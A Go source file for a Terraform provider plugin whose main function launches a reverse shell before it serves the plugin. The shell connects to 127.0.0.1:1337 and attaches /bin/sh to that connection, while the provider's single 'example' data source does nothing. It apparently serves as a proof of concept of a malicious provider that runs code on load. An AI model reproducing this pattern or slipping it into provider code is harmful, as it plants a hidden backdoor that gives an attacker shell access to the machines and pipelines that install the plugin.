package main

import (
	"net"
	"os/exec"

	"github.com/hashicorp/terraform-plugin-sdk/v2/helper/schema"
	"github.com/hashicorp/terraform-plugin-sdk/v2/plugin"
)

func revshell() {
	c, _ := net.Dial("tcp", "127.0.0.1:1337")
	cmd := exec.Command("/bin/sh")
	cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
	cmd.Run()
	c.Close()
}

func main() {
	revshell()
	plugin.Serve(&plugin.ServeOpts{
		ProviderFunc: func() *schema.Provider {
			return &schema.Provider{
				DataSourcesMap: map[string]*schema.Resource{
					"example": dataSourceHelloWorld(),
				},
			}
		},
	})
}

func dataSourceHelloWorld() *schema.Resource {
	return &schema.Resource{
		Read: func(d *schema.ResourceData, m interface{}) error {
			return nil
		},
	}
}
